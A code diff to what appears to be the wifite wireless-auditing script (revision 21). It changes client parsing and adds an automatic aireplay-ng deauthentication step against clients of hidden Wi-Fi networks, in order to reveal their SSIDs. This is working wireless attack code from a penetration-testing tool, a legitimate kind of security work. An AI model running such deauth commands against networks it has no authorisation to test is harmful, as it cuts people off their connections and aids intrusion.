@@ -23,7 +23,7 @@ import tkFileDialog   # for selecting the dictionary file
 import threading      # so the GUI doesn't lock up
 
 # current revision
-REVISION=20
+REVISION=21
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -2619,16 +2619,16 @@ def gettargets():
 
 def parsetargets():
 	"""reads through 'wifite-01.csv' and adds any valid targets to the global list TARGETS """
-	global TARGETS, CLIENTS, WEP, WPA, TEMPDIR
+	global TARGETS, CLIENTS, WEP, WPA, TEMPDIR, CHANNEL, IFACE
 	
 	TARGETS=[]
-	CLIENTS={}
 	try:
 		f = open(TEMPDIR+'wifite-01.csv', 'r')
 		clients=False
 		lines = f.readlines()
 		for line in lines:
 			if line.find('Station MAC') != -1:
+				CLIENTS={}
 				clients=True
 				
 			elif line.find('Authentication') == -1 and clients == False:
@@ -2658,6 +2658,15 @@ def parsetargets():
 							temp[5] = str(int(temp[5]) + 100)
 						if int(temp[7]) == len(temp[8]) and temp[8] != '' and temp[8] != ( chr(0) * len(temp[8])):
 							TARGETS.append(temp)
+						elif temp[8] == ( chr(0) * len(temp[8])) and CHANNEL != '0':
+							# it's a hidden network and we're on a fixed channel
+							client=CLIENTS.get(temp[0],None)
+							if client != None:
+								# we have a client, better call deauth
+								print '\r'+GR+'[+]'+W+' found hidden network and client, '+G+'sending 1 deauth...'
+								deauth_cmd = ['aireplay-ng','-0','1','-a',temp[0],'-c',client,IFACE]
+								subprocess.call(deauth_cmd, stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
+							
 				
 			elif line.find('Station MAC') == -1 and clients == True:
 				# client
